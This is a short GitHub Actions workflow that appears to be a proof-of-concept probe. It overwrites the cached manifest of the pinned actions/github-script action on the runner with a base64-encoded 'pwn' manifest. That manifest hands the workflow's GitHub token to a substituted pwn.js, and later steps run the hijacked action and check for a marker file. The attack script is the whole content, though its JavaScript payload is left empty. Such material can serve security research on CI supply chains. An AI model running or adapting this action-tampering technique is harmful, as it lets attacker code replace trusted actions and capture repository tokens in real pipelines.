name: zz Manifest Hijack Node Probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - name: locate and hijack later node action manifest
        env:
          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yi10b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KICBnaXRodWJfdG9rZW46CiAgICBkZWZhdWx0OiAke3sgZ2l0aHViLnRva2VuIH19CnJ1bnM6CiAgdXNpbmc6IG5vZGUyMAogIG1haW46IHB3bi5qcwo="
          JS_B64: ""
        run: |
          echo "--- work dir ---"; ls -la /home/runner/work 2>&1 | head
          echo "--- actions dirs ---"; ls -d /home/runner/work/_actions/*/* 2>&1 | head -20
          d=/home/runner/work/_actions/actions/github-script/60a0d83039c74a4aee543508d2ffcb1c3799cdea
          echo "--- target ---"; ls -la "$d" 2>&1 | head -8
          printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml" && echo WROTE_MANIFEST
          printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js" && echo WROTE_JS
      - name: use hijacked node action
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: console.log('LEGIT_GITHUB_SCRIPT_RAN')
      - name: proof
        if: always()
        run: cat /tmp/pwn_marker.txt 2>&1 || echo NO_MARKER
